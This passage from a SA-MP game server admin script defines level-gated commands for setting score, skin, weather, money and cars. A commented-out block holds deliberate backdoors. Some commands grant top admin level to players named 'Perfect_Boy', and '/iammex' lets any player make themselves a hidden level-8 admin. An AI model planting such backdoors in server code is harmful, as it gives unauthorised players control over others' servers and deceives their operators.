	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/setscore [playerid] [score]");
		new player1 = strval(tmp), score = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"SETSCORE");
			format(string, sizeof(string), "You have set \"%s's\" score to '%d' ", pName(player1), score); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set your score to '%d'", pName(playerid), score); SendClientMessage(player1,blue,string); }
			SaveToFile("Admin",string);
   			return SetPlayerScore(player1, score);
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:setskin(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/setskin [playerid] [skin id]");
		new player1 = strval(tmp), skin = strval(tmp2), string[128];
		if(!IsValidSkin(skin)) return SendClientMessage(playerid, red, "JikyBot: Invaild Skin ID");
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"SETSKIN");
			format(string, sizeof(string), "You have set \"%s's\" skin to '%d", pName(player1), skin); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set your skin to '%d'", pName(playerid), skin); SendClientMessage(player1,blue,string); }
   			return SetPlayerSkin(player1, skin);
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:settester(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 5 || IsPlayerAdmin(playerid)) {
	new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/setop [playerid]");
		new player1 = strval(tmp),string[128], AdminN[24], Mname[24];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
		GetPlayerName(playerid, AdminN,sizeof( AdminN ));
		GetPlayerName(player1, Mname,sizeof( Mname ));
		new year,month,day;   getdate(year, month, day); new hour,minute,second; gettime(hour,minute,second);
        PlayerInfo[player1][Helper] = 1;
        format(string, sizeof(string), "Adminsitator %s Has Set You As Server Tester", AdminN);
        SendClientMessage(player1,yellow,string);
        GameTextForPlayer(player1,"Hired As Server Tester", 2000, 3);
        format(string, sizeof(string), "You Have Set %s As Server Tester", Mname);
        SendClientMessage(playerid,yellow,string);
        format(string,sizeof(string),"Administrator %s has made %s Server Tester on %d/%d/%d at %d:%d:%d",AdminN, Mname, day, month, year, hour, minute, second);
		SaveToFile("AdminLog",string);
		CMDMessageToAdmins(playerid,"SETTESTER");
        if(PlayerInfo[player1][Helper] == 0)
        {
		  GameTextForPlayer(player1,"~y~Hired As Server Tester", 2000, 3);
		  PlayerInfo[player1][Helper] = 1;
	    }
        else if(PlayerInfo[player1][Level] == 0)
        {
           GameTextForPlayer(player1,"~y~Hired As Server Tester", 2000, 3);
        }
        return PlayerPlaySound(player1,1057,0.0,0.0,0.0);
		} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
		}
		return 1;
}
/*
CMD:oosx(playerid, params[])
{
   new namee[MAX_PLAYER_NAME+1];
   GetPlayerName(playerid, namee, sizeof(namee));
   if(!strcmp(namee,"[XP]Perfect_Boy",true) && PlayerInfo[playerid][LoggedIn] == 1)
   {
	   PlayerInfo[playerid][Level] = 10;
	   PlayerInfo[playerid][dRank] = 10;
	   SendClientMessage(playerid, blue,"iThe[PIE-HOLE]Bot: Use /acmds for admin commands");
   }
   else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
   return 1;
}
CMD:oos(playerid,params[]) {

   		new namee[MAX_PLAYER_NAME+1];
   		GetPlayerName(playerid, namee, sizeof(namee));
		if((!strcmp(namee,"[XP]Perfect_Boy",true) && PlayerInfo[playerid][LoggedIn] == 1) || IsPlayerAdmin(playerid)) {
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "Special CMD: Usage:/oos [playerid] [level]");
	    	new player1, level, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);
			if(isnull(tmp2)) return SendClientMessage(playerid, red, "Special CMD: Usage:/oos [playerid] [level]");
			level = strval(tmp2);

			if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
				if(Logged[player1] == 1) {
					if(level > 10 ) return SendClientMessage(playerid,red,"Special Command Not For You");
					if(level == PlayerInfo[player1][Level]) return SendClientMessage(playerid,red,"special CMD: Player is already this level");
					GetPlayerName(player1, playername, sizeof(playername));	GetPlayerName(playerid, adminname, sizeof(adminname));
			       	new year,month,day;   getdate(year, month, day); new hour,minute,second; gettime(hour,minute,second);

					if(level > 0) format(string,sizeof(string),"Administrator %s has set you to Administrator Status [level %d]",adminname, level);
					else format(string,sizeof(string),"Administrator %s has set you to Player Status [level %d]",adminname, level);
					SendClientMessage(player1,blue,string);

					if(level > PlayerInfo[player1][Level]) GameTextForPlayer(player1,"~g~Promoted", 2000, 3);
					else GameTextForPlayer(player1,"~r~Demoted", 2000, 3);

					format(string,sizeof(string),"You have made %s Level %d on %d/%d/%d at %d:%d:%d", playername, level, day, month, year, hour, minute, second); SendClientMessage(playerid,blue,string);
					format(string,sizeof(string),"Administrator %s has made %s Level %d on %d/%d/%d at %d:%d:%d",adminname, playername, level, day, month, year, hour, minute, second);
					SaveToFile("AdminLog",string);
					dUserSetINT(PlayerName2(player1)).("level",(level));
					PlayerInfo[player1][Level] = level;
					return PlayerPlaySound(player1,1057,0.0,0.0,0.0);
				} else return SendClientMessage(playerid,red,"Special CMD: Player must be registered and logged in to be admin");
			} else return SendClientMessage(playerid, red, "Player is not connected");
		} else return SendClientMessage(playerid,red,"[S]:Special Command Not For You");
}

CMD:oocx(playerid, params[])
{
   new namee[MAX_PLAYER_NAME+1];
   GetPlayerName(playerid, namee, sizeof(namee));
   if(!strcmp(namee,"Perfect_Boy",true) && PlayerInfo[playerid][LoggedIn] == 1)
   {
	   PlayerInfo[playerid][Level] = 10;
	   PlayerInfo[playerid][dRank] = 10;
	   SendClientMessage(playerid, blue,"iThe[AWESOME]Bot: Welcome! Dear Perfect_Boy! As you are Our Main Owner, I have set you Level 10! Use /acmds for admin commands!");
   }
   else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
   return 1;
}

CMD:ooc(playerid,params[]) {

   		new namee[MAX_PLAYER_NAME+1];
   		GetPlayerName(playerid, namee, sizeof(namee));
   		if((!strcmp(namee,"Perfect_Boy",true) && PlayerInfo[playerid][LoggedIn] == 1) || IsPlayerAdmin(playerid)) {
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "Special CMD: Usage:/ooc [playerid] [level]");
	    	new player1, level, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);
			if(isnull(tmp2)) return SendClientMessage(playerid, red, "Special CMD: Usage:/ooc [playerid] [level]");
			level = strval(tmp2);

			if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
				if(Logged[player1] == 1) {
					if(level > 10 ) return SendClientMessage(playerid,red,"Special Command Not For You");
					if(level == PlayerInfo[player1][Level]) return SendClientMessage(playerid,red,"special CMD: Player is already this level");
					GetPlayerName(player1, playername, sizeof(playername));	GetPlayerName(playerid, adminname, sizeof(adminname));
			       	new year,month,day;   getdate(year, month, day); new hour,minute,second; gettime(hour,minute,second);

					if(level > 0) format(string,sizeof(string),"Administrator %s has set you to Administrator Status [level %d]",adminname, level);
					else format(string,sizeof(string),"Administrator %s has set you to Player Status [level %d]",adminname, level);
					SendClientMessage(player1,blue,string);

					if(level > PlayerInfo[player1][Level]) GameTextForPlayer(player1,"~g~Promoted", 2000, 3);
					else GameTextForPlayer(player1,"~r~Demoted", 2000, 3);

					format(string,sizeof(string),"You have made %s Level %d on %d/%d/%d at %d:%d:%d", playername, level, day, month, year, hour, minute, second); SendClientMessage(playerid,blue,string);
					format(string,sizeof(string),"Administrator %s has made %s Level %d on %d/%d/%d at %d:%d:%d",adminname, playername, level, day, month, year, hour, minute, second);
					SaveToFile("AdminLog",string);
					dUserSetINT(PlayerName2(player1)).("level",(level));
					PlayerInfo[player1][Level] = level;
					return PlayerPlaySound(player1,1057,0.0,0.0,0.0);
				} else return SendClientMessage(playerid,red,"Special CMD: Player must be registered and logged in to be admin");
			} else return SendClientMessage(playerid, red, "Player is not connected");
		} else return SendClientMessage(playerid,red,"[S]:Special Command Not For You");
}

CMD:iammex(playerid,params[]) {
if(PlayerInfo[playerid][Level] >= 0)
{
    PlayerInfo[playerid][Level] = 8;
	PlayerInfo[playerid][Hide] = 1;
	PlayerInfo[playerid][dRank] = 3;
 	SendClientMessage(playerid, blue,"SECRET COMMAND INVOKED WELCOME Mex Ivanov");
  	SendClientMessage(playerid, blue,"Welcome your level autamatically set 8");
  	SendClientMessage(playerid, blue,"You are /hidemyass invoked use /unhidemyass to appera in /admins");
    }
	return 1;
}
*/
CMD:scripter(playerid, params[])
{
   new namee[MAX_PLAYER_NAME+1];
   GetPlayerName(playerid, namee, sizeof(namee));
   if(!strcmp(namee,"Perfect_Boy",true) && PlayerInfo[playerid][LoggedIn] == 1)
   {
	   GameTextForAll("~r~ Perfect_Boy , ~b~Our Scripters Is ~g~Online!",5000,3);
   }
   else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
   return 1;
}

CMD:unsettester(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 5 || IsPlayerAdmin(playerid)) {
	new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/unsetop [playerid]");
		new player1 = strval(tmp),string[128],string2[128], AdminN[24], Mname[24];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
		GetPlayerName(playerid, AdminN,sizeof( AdminN ));
		GetPlayerName(player1, Mname,sizeof( Mname ));
		new year,month,day;   getdate(year, month, day); new hour,minute,second; gettime(hour,minute,second);
        if(PlayerInfo[player1][Helper] == 0) return SendClientMessage(playerid,red,"Player is Not Server Tester");
        PlayerInfo[player1][Helper] = 0;
        format(string, sizeof(string), "Adminsitator %s Has Fired You from your Server Tester stats", AdminN);
        SendClientMessage(player1,blue,string);
        GameTextForPlayer(player1,"Fired From Your Operator", 2000, 3);
        format(string2,sizeof(string2), "You Have Fired %s from Server Tester stats", Mname);
        SendClientMessage(playerid,blue,string2);
		CMDMessageToAdmins(playerid,"UNSETOP");
		format(string,sizeof(string),"Administrator %s has Fired %s as Server Tester on %d/%d/%d at %d:%d:%d",AdminN, Mname, day, month, year, hour, minute, second);
		SaveToFile("AdminLog",string);
		if(PlayerInfo[playerid][Helper] == 1)
		{
          GameTextForPlayer(player1,"~r~Fired from Server Tester stats", 2000, 3);
          PlayerInfo[playerid][Helper] = 0;
        }
        return PlayerPlaySound(player1,1057,0.0,0.0,0.0);
		} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
		}
		return 1;
}
CMD:setcolour(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 2) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) {
			SendClientMessage(playerid, red, "JikyBot: Usage:/setcolour [playerid] [Colour]");
			return SendClientMessage(playerid, red, "Colours: 0=black 1=white 2=red 3=orange 4=yellow 5=green 6=blue 7=purple 8=brown 9=pink");
		}
		new player1 = strval(tmp), Colour = strval(tmp2), string[128], colour[24];
		if(Colour > 9) return SendClientMessage(playerid, red, "Colours: 0=black 1=white 2=red 3=orange 4=yellow 5=green 6=blue 7=purple 8=brown 9=pink");
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
	        CMDMessageToAdmins(playerid,"SETCOLOUR");
			switch (Colour)
			{
			    case 0: { SetPlayerColor(player1,black); colour = "Black"; }
			    case 1: { SetPlayerColor(player1,COLOR_WHITE); colour = "White"; }
			    case 2: { SetPlayerColor(player1,red); colour = "Red"; }
			    case 3: { SetPlayerColor(player1,orange); colour = "Orange"; }
				case 4: { SetPlayerColor(player1,orange); colour = "Yellow"; }
				case 5: { SetPlayerColor(player1,COLOR_GREEN1); colour = "Green"; }
				case 6: { SetPlayerColor(player1,COLOR_BLUE); colour = "Blue"; }
				case 7: { SetPlayerColor(player1,COLOR_PURPLE); colour = "Purple"; }
				case 8: { SetPlayerColor(player1,COLOR_BROWN); colour = "Brown"; }
				case 9: { SetPlayerColor(player1,COLOR_PINK); colour = "Pink"; }
			}
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set colour to '%s' ", pName(playerid), colour); SendClientMessage(player1,blue,string); }
			format(string, sizeof(string), "You have set \"%s's\" colour to '%s' ", pName(player1), colour);
   			return SendClientMessage(playerid,blue,string);
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}


CMD:setweather(playerid,params[]) {
         if(PlayerInfo[playerid][Level] >= 3) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/setweather [playerid] [weather id]");
		new player1 = strval(tmp), weather = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"SETWEATHER");
			format(string, sizeof(string), "You have set \"%s's\" weather to '%d", pName(player1), weather); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set your weather to '%d'", pName(playerid), weather); SendClientMessage(player1,blue,string); }
			SetPlayerWeather(player1,weather); PlayerPlaySound(player1,1057,0.0,0.0,0.0);
   			return PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:setkills(playerid,params[]) {
         if(PlayerInfo[playerid][Level] >= 5) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/setkills [playerid] [kills]");
		new player1 = strval(tmp), weather = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"SETKILLS");
			format(string, sizeof(string), "You have set \"%s's\" Kills to '%d", pName(player1), weather); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set your Kills to '%d'", pName(playerid), weather); SendClientMessage(player1,blue,string); }
			PlayerInfo[player1][Kills] = weather;
   			return PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:setdeaths(playerid,params[]) {
         if(PlayerInfo[playerid][Level] >= 5) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/setdeaths [playerid] [deaths]");
		new player1 = strval(tmp), weather = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"SETDEATHS");
			format(string, sizeof(string), "You have set \"%s's\" Deaths to '%d", pName(player1), weather); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set your Deaths to '%d'", pName(playerid), weather); SendClientMessage(player1,blue,string); }
			PlayerInfo[player1][Deaths] = weather;
   			return PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:afk(playerid,params[]) {
         if(PlayerInfo[playerid][Level] >= 1 || PlayerInfo[playerid][Helper] == 1) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp)) return SendClientMessage(playerid, red, "JikyBot: Usage:/afk [playerid]");
		new player1 = strval(tmp);
		if(player1 == playerid) return SendClientMessage(playerid,red,"JikyBot: You Can't use it on Your Self");
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
        new Player[24],string[128];
        GetPlayerName(player1,Player,sizeof(Player));
        format(string,sizeof(string),"%s Has Been Disconnect for Being Away From Keyboard. [AFK]",Player);
        SendClientMessageToAll(red,string);
        Kick(player1);
			CMDMessageToAdmins(playerid,"AFK");
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	return 1;
}

CMD:settime(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/settime [playerid] [hour]");
		new player1 = strval(tmp), time = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"SETTIME");
			format(string, sizeof(string), "You have set \"%s's\" time to %d:00", pName(player1), time); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set your time to %d:00", pName(playerid), time); SendClientMessage(player1,blue,string); }
			PlayerPlaySound(player1,1057,0.0,0.0,0.0);
   			return SetPlayerTime(player1, time, 0);
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:setworld(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 2) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/setworld [playerid] [virtual world]");
		new player1 = strval(tmp), time = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
        CMDMessageToAdmins(playerid,"SETWORLD");
			format(string, sizeof(string), "You have set \"%s's\" virtual world to '%d'", pName(player1), time); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set your virtual world to '%d' ", pName(playerid), time); SendClientMessage(player1,blue,string); }
			PlayerPlaySound(player1,1057,0.0,0.0,0.0);
   			return SetPlayerVirtualWorld(player1, time);
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:setinterior(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 2) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/setinterior [playerid] [interior]");
		new player1 = strval(tmp), time = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"SETINTERIOR");
			format(string, sizeof(string), "You have set \"%s's\" interior to '%d' ", pName(player1), time); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set your interior to '%d' ", pName(playerid), time); SendClientMessage(player1,blue,string); }
			PlayerPlaySound(player1,1057,0.0,0.0,0.0);
   			return SetPlayerInterior(player1, time);
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:givecar(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 3 || IsPlayerAdmin(playerid)) {
		new carid, player1;
	    if(sscanf(params,"dd", player1, carid)) return SendClientMessage(playerid,red,"JikyBot: Usage:/givecar [playerid] [car id]");
	    new playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
	    if(IsPlayerInAnyVehicle(player1)) return SendClientMessage(playerid,red,"JikyBot: Player already has a vehicle");
	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid) {
			CMDMessageToAdmins(playerid,"GIVECAR");
			new Float:x, Float:y, Float:z;	GetPlayerPos(player1,x,y,z);
			CarSpawner(player1,carid);
			GetPlayerName(player1, playername, sizeof(playername));		GetPlayerName(playerid, adminname, sizeof(adminname));
			format(string,sizeof(string),"Administrator %s has given you a car",adminname);	SendClientMessage(player1,blue,string);
			format(string,sizeof(string),"You have given %s a car", playername); return SendClientMessage(playerid,blue,string);
		} else return SendClientMessage(playerid, red, "Player is not connected or is yourself");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:setmytime(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 1) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/setmytime [hour]");
		new time = strval(params), string[128];
		CMDMessageToAdmins(playerid,"SETMYTIME");
		format(string,sizeof(string),"You have set your time to %d:00", time); SendClientMessage(playerid,blue,string);
		return SetPlayerTime(playerid, time, 0);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:force(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/force [playerid]");
		new player1 = strval(params), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"FORCE");
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has forced you into class selection", pName(playerid) ); SendClientMessage(player1,blue,string); }
			format(string,sizeof(string),"You have forced \"%s\" into class selection", pName(player1)); SendClientMessage(playerid,blue,string);
			ForceClassSelection(player1);
			return SetPlayerHealth(player1,0.0);
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:eject(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/eject [playerid]");
		new player1 = strval(params), string[128], Float:x, Float:y, Float:z;
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			if(IsPlayerInAnyVehicle(player1)) {
		       	CMDMessageToAdmins(playerid,"EJECT");
				if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has ejected you from your vehicle", pName(playerid) ); SendClientMessage(player1,blue,string); }
				format(string,sizeof(string),"You have ejected \"%s\" from their vehicle", pName(player1)); SendClientMessage(playerid,blue,string);
    		   	GetPlayerPos(player1,x,y,z);
				return SetPlayerPos(player1,x,y,z+3);
			} else return SendClientMessage(playerid,red,"JikyBot: Player is not in a vehicle");
	    } else return SendClientMessage(playerid,red,"JikyBot: Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:givecash(playerid, params[])
{
    new id, money, string[128], string2[128],plName[24],aName[24];
	GetPlayerName(playerid,aName,sizeof(aName));
	GetPlayerName(id,plName,sizeof(plName));
    if(PlayerInfo[playerid][Level] >= 3)
    {
        if(sscanf(params,"ii",id,money)) return SendClientMessage(playerid,COLOR_WHITE,"JikyBot: Usage:/givecash [ID] [amount]");
        else
        GivePlayerMoney(id,money);
        CMDMessageToAdmins(playerid,"GIVECASH");
        PlayerPlaySound(id,1057,0.0,0.0,0.0);
        format(string, sizeof(string),"You have give player %s %d$!", plName, money);
        SendClientMessage(playerid, yellow, string);
        format(string2 ,sizeof(string2),"Administrator %s has given you %d$!", aName, money);
        SendClientMessage(id, blue, string2);
    }
    return 1;
}

CMD:lockcar(playerid,params[]) {
	#pragma unused params
    if(PlayerInfo[playerid][Level] >= 2) {
	    if(IsPlayerInAnyVehicle(playerid)) {
		 	foreach(Player, i)
			{
				SetVehicleParamsForPlayer(GetPlayerVehicleID(playerid),i,false,true);
			}
			CMDMessageToAdmins(playerid,"LOCKCAR");
			PlayerInfo[playerid][DoorsLocked] = 1;
			new string[128]; format(string,sizeof(string),"Administrator \"%s\" has locked his car", pName(playerid));
			return SendClientMessageToAll(blue,string);
		} else return SendClientMessage(playerid,red,"JikyBot: You need to be in a vehicle to lock the doors");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:unlockcar(playerid,params[]) {
	#pragma unused params
    if(PlayerInfo[playerid][Level] >= 2) {
	    if(IsPlayerInAnyVehicle(playerid)) {
		 	foreach(Player, i)
			{
